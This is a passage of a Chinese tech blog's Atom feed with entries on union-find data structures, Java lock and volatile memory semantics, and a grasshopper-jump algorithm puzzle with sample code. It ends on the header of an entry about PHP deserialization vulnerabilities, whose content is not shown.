&lt;li&gt;KMP算法的核心思想&lt;/li&gt;
&lt;li&gt;KMP算法的实现原理&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
    
      <category term="算法练习" scheme="https://blog.kaide0521.cn/categories/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="KMP" scheme="https://blog.kaide0521.cn/tags/KMP/"/>
    
  </entry>
  
  <entry>
    <title>并查集及其应用</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/%E5%B9%B6%E6%9F%A5%E9%9B%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/%E5%B9%B6%E6%9F%A5%E9%9B%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/</id>
    <published>2020-01-05T13:15:59.000Z</published>
    <updated>2020-01-05T13:16:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="并查集及其应用"><a href="#并查集及其应用" class="headerlink" title="并查集及其应用"></a><strong>并查集及其应用</strong></h2><ul><li>什么是并查集</li><li>如何构建并查集</li><li>案例分析</li><li>改进有怀</li></ul><p>HDOJ-1232<br>HDOJ-1829<br>HDOJ-1213<br>HDOJ-3635</p><h3 id="什么是并查集？"><a href="#什么是并查集？" class="headerlink" title="什么是并查集？"></a><strong>什么是并查集？</strong></h3><p>并查集是在解决动态连通性一类问题的一种算法，使用到了一种叫做并查集的数据结构，并查集是一种树型的数据结构，用于处理一些不相交集合的合并问题</p><h3 id="如何构建并查集？"><a href="#如何构建并查集？" class="headerlink" title="如何构建并查集？"></a><strong>如何构建并查集？</strong></h3><p>并查集的主要操作有：<br>1－合并两个不相交集合<br>2－判断两个元素是否属于同一个集合<br>3－路径压缩</p><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a><strong>方式一</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定义：set[i]表示节点i的父亲节点， 1&#x3D;&lt; i &lt;&#x3D;N</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 查找，O(1)</span><br><span class="line"> * @param x</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">int find_0(int x)&#123;</span><br><span class="line">    return set[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 合并时候搜索所有的元素 ; O(N)</span><br><span class="line"> * @param x</span><br><span class="line"> * @param y</span><br><span class="line"> *&#x2F;</span><br><span class="line">void merge_0(int x,int y)&#123;</span><br><span class="line">    int rx &#x3D; find_0(x);</span><br><span class="line">    int ry &#x3D; find_0(y);</span><br><span class="line"></span><br><span class="line">    if(rx &#x3D;&#x3D; ry) return;</span><br><span class="line"></span><br><span class="line">    for(int i &#x3D; 1; i &lt;&#x3D; n ; i++)&#123;</span><br><span class="line">        if(set[i] &#x3D;&#x3D; rx)&#123;</span><br><span class="line">            set[i] &#x3D; ry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a><strong>方式二</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 循环的查找父节点</span><br><span class="line"> * &lt;p&gt;最坏情况：O(N)&lt;&#x2F;p&gt;</span><br><span class="line"> * &lt;p&gt;一般情况：O(logN)&lt;&#x2F;p&gt;</span><br><span class="line"> * @param x</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">int find_1(int x)&#123;</span><br><span class="line">    int r &#x3D; x;</span><br><span class="line">    while(set[r] !&#x3D; r)&#123;</span><br><span class="line">        r &#x3D; set[r];</span><br><span class="line">    &#125;</span><br><span class="line">    return r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 简单的合并，以小的为父节点,O(1)</span><br><span class="line"> * @param x</span><br><span class="line"> * @param y</span><br><span class="line"> *&#x2F;</span><br><span class="line">void merge_1(int x ,int y)&#123;</span><br><span class="line">    int rx &#x3D; x;</span><br><span class="line">    int ry &#x3D; y;</span><br><span class="line">    if(rx &lt; ry)&#123;</span><br><span class="line">        set[ry] &#x3D; rx;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        set[rx] &#x3D; ry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a><strong>方式三</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 循环的查找父节点</span><br><span class="line"> * &lt;p&gt;最坏情况：O(logN)&lt;&#x2F;p&gt;</span><br><span class="line"> * &lt;p&gt;一般情况：O(1)&lt;&#x2F;p&gt;</span><br><span class="line"> * @param x</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">int find_2(int x)&#123;</span><br><span class="line">    int r &#x3D; x;</span><br><span class="line">    while(set[r] !&#x3D; r)&#123;</span><br><span class="line">        r &#x3D; set[r];</span><br><span class="line">    &#125;</span><br><span class="line">    return r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 利用平衡二叉树的思想对子节点进行平衡处理，使用数组rank[i]记录节点i的子节点的个数</span><br><span class="line"> * &lt;p&gt;时间复杂度：O(1)&lt;&#x2F;p&gt;</span><br><span class="line"> * @param x</span><br><span class="line"> * @param y</span><br><span class="line"> *&#x2F;</span><br><span class="line">void merge_2(int x,int y)&#123;</span><br><span class="line">    if(rank[x] &gt;&#x3D; rank[y])&#123;</span><br><span class="line">        set[y] &#x3D; x;</span><br><span class="line">        rank[x] +&#x3D; rank[y];</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        set[x] &#x3D; y;</span><br><span class="line">        rank[y] +&#x3D; rank[x];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方式四"><a href="#方式四" class="headerlink" title="方式四"></a><strong>方式四</strong></h3><p>思路：每次查找的时候如果路径较长，则修改路径上的节点信息，使其都指向根节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 带路径压缩的非递归找根节点</span><br><span class="line"> *</span><br><span class="line"> * @param x</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">int find_3(int x)&#123;</span><br><span class="line">    int t &#x3D; x;</span><br><span class="line">    while(set[t] !&#x3D; t)&#123;</span><br><span class="line">        t &#x3D; set[t];</span><br><span class="line">    &#125;</span><br><span class="line">    int i &#x3D; x;</span><br><span class="line">    int temp;</span><br><span class="line">    while( i !&#x3D; t)&#123;</span><br><span class="line">        temp &#x3D; set[i];</span><br><span class="line">        set[i] &#x3D; t;</span><br><span class="line">        i &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">    return t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 带路径压缩的递归找根节点</span><br><span class="line"> * @param x</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">int find_3recursion(int x)&#123;</span><br><span class="line"></span><br><span class="line">    if(set[x] !&#x3D; x)&#123;</span><br><span class="line">        set[x] &#x3D; find_3recursion(set[x]);</span><br><span class="line">    &#125;</span><br><span class="line">    return set[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 利用平衡二叉树的思想对子节点进行平衡处理，使用数组rank[i]记录节点i的子节点的个数</span><br><span class="line"> * &lt;p&gt;时间复杂度：O(1)&lt;&#x2F;p&gt;</span><br><span class="line"> * @param x</span><br><span class="line"> * @param y</span><br><span class="line"> *&#x2F;</span><br><span class="line">void merge_3(int x, int y)&#123;</span><br><span class="line">    if(rank[x] &gt; rank[y])&#123;</span><br><span class="line">        set[y] &#x3D; x;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(rank[x] &#x3D;&#x3D; rank[y])&#123;</span><br><span class="line">            rank[y]++;</span><br><span class="line">        &#125;</span><br><span class="line">        set[x] &#x3D; y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;并查集及其应用&quot;&gt;&lt;a href=&quot;#并查集及其应用&quot; class=&quot;headerlink&quot; title=&quot;并查集及其应用&quot;&gt;&lt;/a&gt;&lt;strong&gt;并查集及其应用&lt;/strong&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;什么是并查集&lt;/li&gt;
&lt;li&gt;如何构建并查集&lt;/li
      
    
    </summary>
    
    
      <category term="算法练习" scheme="https://blog.kaide0521.cn/categories/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="并查集" scheme="https://blog.kaide0521.cn/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>锁与volatile的内存语义</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/%E9%94%81%E4%B8%8Evolatile%E7%9A%84%E5%86%85%E5%AD%98%E8%AF%AD%E4%B9%89/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/%E9%94%81%E4%B8%8Evolatile%E7%9A%84%E5%86%85%E5%AD%98%E8%AF%AD%E4%B9%89/</id>
    <published>2020-01-05T13:14:23.000Z</published>
    <updated>2020-01-05T13:15:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="锁与volatile的内存语义"><a href="#锁与volatile的内存语义" class="headerlink" title="锁与volatile的内存语义"></a><strong>锁与volatile的内存语义</strong></h2><ul><li>1.锁的内存语义</li><li>2.volatile内存语义</li><li>3.synchronized内存语义</li><li>4.Lock与synchronized的区别</li><li>5.ReentrantLock源码实例分析</li></ul><hr><h3 id="1-锁的内存语义"><a href="#1-锁的内存语义" class="headerlink" title="1.锁的内存语义"></a><strong>1.锁的内存语义</strong></h3><p>锁是java并发编程中最重要的同步机制。锁除了让临界区互斥执行外，还可以让释放锁的线程向获取同一个锁的线程发送消息。</p><h3 id="1-1-锁释放和获取的内存语义"><a href="#1-1-锁释放和获取的内存语义" class="headerlink" title="1.1 锁释放和获取的内存语义"></a><strong>1.1 锁释放和获取的内存语义</strong></h3><p>当线程释放锁时，JMM会把该线程对应的本地内存中的共享变量刷新到主内存中；<br>当线程获取锁时，JMM会当前线程拥有的本地内存共享变量置为无效，从而使得被监视器保护的临界区代码必须要从主内存中去读取共享变量；</p><h3 id="1-2-CAS操作"><a href="#1-2-CAS操作" class="headerlink" title="1.2 CAS操作"></a><strong>1.2 CAS操作</strong></h3><p>CAS是单词compare and set的缩写，意思是指在set之前先比较该值有没有变化，只有在没变的情况下才对其赋值。</p><p>问题：如何在没有锁的情况下实现i++原子操作？</p><p>CAS操作涉及到三个操作数，一个是内存值，一个是旧的预期值，一个是更新后的值，如果内存值和旧的预期值没有发生变化，才设置成新的值。</p><pre><code>  public final int incrementAndGet() {    for (;;) {        //得到预期值        int current = get();        //得到更新后的值        int next = current + 1;        //通过CAS操作验证是否发生变化        if (compareAndSet(current, next))            return next;    }}</code></pre><p>CAS的原子性实际上是CPU实现的.</p><p>CAS操作用途：可以用CAS在无锁的情况下实现原子操作，但要明确应用场合，非常简单的操作且又不想引入锁可以考虑使用CAS操作，当想要非阻塞地完成某一操作也可以考虑CAS。不推荐在复杂操作中引入CAS，会使程序可读性变差，且难以测试，同时会出现ABA问题。</p><h3 id="2-volatile内存语义"><a href="#2-volatile内存语义" class="headerlink" title="2.volatile内存语义"></a><strong>2.volatile内存语义</strong></h3><p>2.1 volatile关键字的特性：</p><pre><code>（1）可见性：对一个volatile关键字的读，总是能看到（任意线程）对这个关键字的写（2）原子性：对任意单个volatile变量的写操作，具有原子性（注：多个volatile组合操作不具有原子性）</code></pre><ul><li>执行volatile写的时候，JMM会把该线程对应的本地内存（并不是实际存在的，也称为TLB，线程本地缓冲区）刷新到主内存中。这个过程可以理解为线程1（执行写方法的线程）向接下来要读取这个变量的线程（执行读方法的线程）发送了一条消息</li><li>执行volatile读的时候，JMM会把该线程对应的本地内存设置为无效。线程接下来将直接从主内存中读取共享变量的值。这个过程可以理解为线程2接收到了线程1发送的消息</li></ul><p><strong>2.2 内存语义</strong></p><ul><li>当写一个volatile变量时，JMM会将本地变量中对应的共享变量值刷新到主内存中</li><li>当读一个volatile变量时，JMM会将线程本地变量存储的值，置为无效值，线程接下来将从主内存中读取共享变量</li></ul><p><strong>2.3 实现原理</strong></p><pre><code>instance = new Singleton(); 定义一个volatile变量</code></pre><p>其对应编译后的cpu指令为：</p><pre><code>0x01a3de1d: movb $0×0,0×1104800(%esi);0x01a3de24: lock addl $0×0,(%esp);</code></pre><p>由编译后的汇编指令可以看出，改指令相比其他指令多个一个lock前缀</p><p>Lock前缀的指令在多核处理器下会引发了两件事情：</p><ul><li>将当前处理器缓存行中的数据写回到主内存中</li><li>这个写回的过程会使得其他处理器中缓存了该内存地址的数据无效</li></ul><p><strong>具体实现细节：</strong></p><ul><li>锁总线：早期的实现方式，当CPU读取共享变量时会锁住总线，由于cpu和其他部件的通信都是通过总线实现的，如果锁住总线的话，cpu就不能与其他部件之间进行通信，CPU处于等待的状态，导致整个系统的效率低下。</li><li>锁缓存&amp;缓存一致性协议：当CPU写数据时，如果发现操作的变量是共享变量，即在其他CPU中也存在该变量的副本，会发出信号通知其他CPU将该变量的缓存行置为无效状态，因此当其他CPU需要读取这个变量时，发现自己缓存中缓存该变量的缓存行是无效的，那么它就会从内存重新读取。<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GXgEIpXq-1578230026680)(<a href="http://i.imgur.com/i1Fpfis.jpg)]" target="_blank" rel="noopener">http://i.imgur.com/i1Fpfis.jpg)]</a></li></ul><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>锁的内存语义的实现与可重入锁相关，可以简要总结锁的内存语义的实现包括以下两种方式：</p><ul><li>利用volatile变量的内存语义</li><li>利用CAS附带的volatile语义</li></ul><h3 id="3-synchronized内存语义"><a href="#3-synchronized内存语义" class="headerlink" title="3. synchronized内存语义"></a><strong>3. synchronized内存语义</strong></h3><pre><code>synchronized也称为监视器锁，由JVM控制实现，每个对象都有类似监视器一样的锁，当监视器锁被占用是对象将会处于锁定状态，每个对象有一个监视器锁（monitor）。当monitor被占用时就会处于锁定状态，线程执行monitorenter指令时尝试获取monitor的所有权，过程如下：</code></pre><ol><li>如果monitor的进入数为0，则该线程进入monitor，然后将进入数设置为1，该线程即为monitor的所有者。</li><li>如果线程已经占有该monitor，只是重新进入，则进入monitor的进入数加1.</li><li>如果其他线程已经占用了monitor，则该线程进入阻塞状态，直到monitor的进入数为0，再重新尝试获取monitor的所有权。</li></ol><p>当线程执行monitorexit指令时候，过程如下：<br>执行monitorexit的线程必须是objectref所对应的monitor的所有者。</p><p>指令执行时，monitor的进入数减1，如果减1后进入数为0，那线程退出monitor，不再是这个monitor的所有者。其他被这个monitor阻塞的线程可以尝试去获取这个 monitor 的所有权。 </p><p>　　通过这两段描述，我们应该能很清楚的看出Synchronized的实现原理，Synchronized的语义底层是通过一个monitor的对象来完成，其实wait/notify等方法也依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用wait/notify等方法，否则会抛出java.lang.IllegalMonitorStateException的异常的原因。　　</p><p>加轻量锁的过程很简单：在当前线程的栈帧（stack frame）中生成一个锁记录（lock record），这个锁记录比前面说的那个对象锁（管理线程队列的monitor）简单多了，它只是对象头的一个拷贝。然后把对象头里的tag改成00，并把这个栈帧里的lock record地址放入对象头里。若操作成功，那就完成了轻量锁操作。如果不成功，说明有线程在竞争，则需要在当前对象上生成重量锁来进行多线程同步，然后将Tag状态改为10，并生成Monitor对象（重量锁对象），对象头里也会放入Monitor对象的地址。最后将当前线程t排队队列中。</p><p>轻量锁的解锁过程也很简单就是把栈帧里刚才的那个lock record拷贝到对象头里，若替换成功，则解锁完成，若替换不成功，表示在当前线程持有锁的这段时间内，其他线程也竞争过锁，并且发生了锁升级为重量锁，这时需要去Monitor的等待队列中唤醒一个线程去重新竞争锁。</p><h3 id="4-Lock与synchronized的区别"><a href="#4-Lock与synchronized的区别" class="headerlink" title="4. Lock与synchronized的区别"></a><strong>4. Lock与synchronized的区别</strong></h3><ol><li>Lock 拥有Synchronized相同的并发性和内存语义，Lock的实现依赖于cpu级别的指令控制，Synchronized的实现主要由JVM实现控制</li><li>synchronized在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而Lock在发生异常时，如果没有主动通过unLock()去释放锁，则很可能造成死锁现象，因此使用Lock时需要在finally块中释放锁；</li><li>Lock可以让等待锁的线程响应中断，而synchronized却不行，使用synchronized时，等待的线程会一直等待下去，不能够响应中断；</li><li>通过Lock可以知道有没有成功获取锁，而synchronized却无法办到。在性能上来说，如果竞争资源不激烈，两者的性能是差不多的，而当竞争资源非常激烈时（即有大量线程同时竞争），此时Lock的性能要远远优于synchronized。所以说，在具体使用时要根据适当情况选择。</li></ol><h5 id="两者在概念上的区别："><a href="#两者在概念上的区别：" class="headerlink" title="两者在概念上的区别："></a><strong>两者在概念上的区别：</strong></h5><pre><code>1. 两者都是可重入的锁；2. synchronized就不是可中断锁，而Lock是可中断锁；3. synchronized是非公平锁，而lock提供公平锁的实现；4. Lock提供读写两种锁操作；</code></pre><h5 id="性能比较："><a href="#性能比较：" class="headerlink" title="性能比较："></a><strong>性能比较：</strong></h5><p>在JDK1.5中，synchronized的性能是比较低的，线程阻塞和唤醒由操作系统内核完成，频繁的加锁和放锁导致频繁的上下文切换，造成效率低下；因此在多线程环境下，synchronized的吞吐量下降的非常严重。但在JDK1.6时对synchronized进行了很多优化，包括偏向锁、自适应自旋、轻量级锁等措施。</p><p>当需要以下高级特性时，才应该使用Lock：可定时的、可轮询的与可中断的锁获取操作，公平队列，或者非块结构的锁。否则，请使用synchronized。</p><h3 id="ReentrantLock源码实例分析"><a href="#ReentrantLock源码实例分析" class="headerlink" title="ReentrantLock源码实例分析"></a><strong>ReentrantLock源码实例分析</strong></h3><p> 参照：[<a href="http://www.cnblogs.com/xrq730/p/4979021.html]" target="_blank" rel="noopener">http://www.cnblogs.com/xrq730/p/4979021.html]</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;锁与volatile的内存语义&quot;&gt;&lt;a href=&quot;#锁与volatile的内存语义&quot; class=&quot;headerlink&quot; title=&quot;锁与volatile的内存语义&quot;&gt;&lt;/a&gt;&lt;strong&gt;锁与volatile的内存语义&lt;/strong&gt;&lt;/h2&gt;&lt;ul&gt;
      
    
    </summary>
    
    
      <category term="java" scheme="https://blog.kaide0521.cn/categories/java/"/>
    
    
      <category term="java内存模型" scheme="https://blog.kaide0521.cn/tags/java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>蚂蚱跳跃问题</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/%E8%9A%82%E8%9A%B1%E8%B7%B3%E8%B7%83%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/%E8%9A%82%E8%9A%B1%E8%B7%B3%E8%B7%83%E9%97%AE%E9%A2%98/</id>
    <published>2020-01-05T12:53:16.000Z</published>
    <updated>2020-01-05T13:13:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="蚂蚱跳跃问题"><a href="#蚂蚱跳跃问题" class="headerlink" title="蚂蚱跳跃问题"></a>蚂蚱跳跃问题</h1><p><strong>题目大意：</strong><br>一个蚂蚱最初位于坐标轴的原点，现在蚂蚱要跳跃到坐标轴的s点，跳跃规则是蚂蚱既可以往正方向跳跃，也可以往负方向跳跃，蚂蚱第一次跳跃1个单位，以后的跳跃步数在前一步的基础上加一。现在求蚂蚱跳跃到s点最少需要多少步数？<br>原题截图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTYwOTIwMTY0ODI4Mjgw?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>题意分析：</p><p>首先看题目的数据最大约为10亿，意味着不可能采用搜索、暴力等一些耗时的解决办法，也不会让你在代码中开辟较大的数组，那么拿到这个问题如何去解决呢？</p><h4 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h4><ol><li><p>假如S为负，则只需求正S的结果</p></li><li><p>如果目标点S恰好能等于S = F(n) =（n(n+1)）/2 , 说明最少只要经过n步就可以准确到达S点</p></li><li><p>S一定介于F(n)与F(n+1)之间，即 F(n) &lt;= S &lt;= F(n+1)</p></li></ol><h4 id="进一步分析-："><a href="#进一步分析-：" class="headerlink" title="进一步分析 ："></a>进一步分析 ：</h4><ol start="4"><li><p>问题其实就是求一个序列1，2，3，…… , m-1, m的和要为S，其中这些数可正可负</p></li><li><p>既然S = 1(-1) + 2(-2) + … … + m(-m)那么蚂蚱必须至少要经过n步（因为F(n) &lt;= S）才能使得步数之和为S</p></li><li><p>假如所蚂蚱经过n步到达F(n)点，那么它下一步跳跃n+1个单位到达F(n+1)点，记 d = F(n+1) - S，在这里插入代码片</p><p><strong>如果d为偶数</strong>，那么一定存在一个数（1=&lt; k &lt;= n）使得 2*k = d , 也就是说 S = 1+2+…..+ n + (n+1)-d</p><p>即S = 1 + 2 + …+(-k) + ….+ n +(n+1)，从而可以知道只要再走一步就可以实现1—n+1个不同符号的数相加和为S.</p><p><strong>假如 d为奇数</strong>，那么在1到n之间不可能有一个数的倍数为d，那么可以再走一步得F(n+2）- S = </p><p>d2，如果d2为偶数，就得解，，否则就再走一步F(n+3) - S = t3,   </p><p>t2和t3一定有一个数为偶数，，问题就得解了,所以当d为奇数的时候要么再n的基础上再走两步，要么再走三步</p></li></ol><h4 id="具体代码实现如下："><a href="#具体代码实现如下：" class="headerlink" title="具体代码实现如下："></a>具体代码实现如下：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**得到第T步的位置**&#x2F;</span><br><span class="line">long result(int t)&#123;</span><br><span class="line">    return (t*(t+1))&#x2F;2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**得到位置X的临近点步数**&#x2F;</span><br><span class="line">getPos(long x) &#123;</span><br><span class="line">int t &#x3D; floor(sqrt(2*x));</span><br><span class="line">int r &#x3D; t + 2;</span><br><span class="line">while(t &lt; r)&#123;</span><br><span class="line">if(result(t) &gt; x)&#123;</span><br><span class="line">return t -1;</span><br><span class="line">&#125;</span><br><span class="line">if(result(t) &#x3D;&#x3D; x)&#123;</span><br><span class="line">return t;</span><br><span class="line">&#125;</span><br><span class="line">t++;</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**求解到达x的最少步数**&#x2F;</span><br><span class="line">int solve(int x)&#123;</span><br><span class="line">    x &#x3D; abs(x);</span><br><span class="line">int left &#x3D; getPos(x);</span><br><span class="line">int leftResult &#x3D; result(left);</span><br><span class="line">if(leftResult &#x3D;&#x3D; x) return left;</span><br><span class="line">if((leftResult+left+1-x)%2 &#x3D;&#x3D; 1)&#123;</span><br><span class="line">return (left + 2)%2 &#x3D;&#x3D; 1 ? left + 2 : left + 3;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return left + 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然测试用例都通过，但是还是不知道能不能AC啊，昨天笔试时间短，竟然都没想出什么解法。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;蚂蚱跳跃问题&quot;&gt;&lt;a href=&quot;#蚂蚱跳跃问题&quot; class=&quot;headerlink&quot; title=&quot;蚂蚱跳跃问题&quot;&gt;&lt;/a&gt;蚂蚱跳跃问题&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;题目大意：&lt;/strong&gt;&lt;br&gt;一个蚂蚱最初位于坐标轴的原点，现在蚂蚱要跳跃到坐标轴的s
      
    
    </summary>
    
    
      <category term="算法练习" scheme="https://blog.kaide0521.cn/categories/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="算法" scheme="https://blog.kaide0521.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞总结</title>
    <link href="https://blog.kaide0521.cn/2019/05/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://blog.kaide0521.cn/2019/05/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-05-12T13:46:37.000Z</published>
    <updated>2020-02-23T13:52:00.000Z</updated>
    
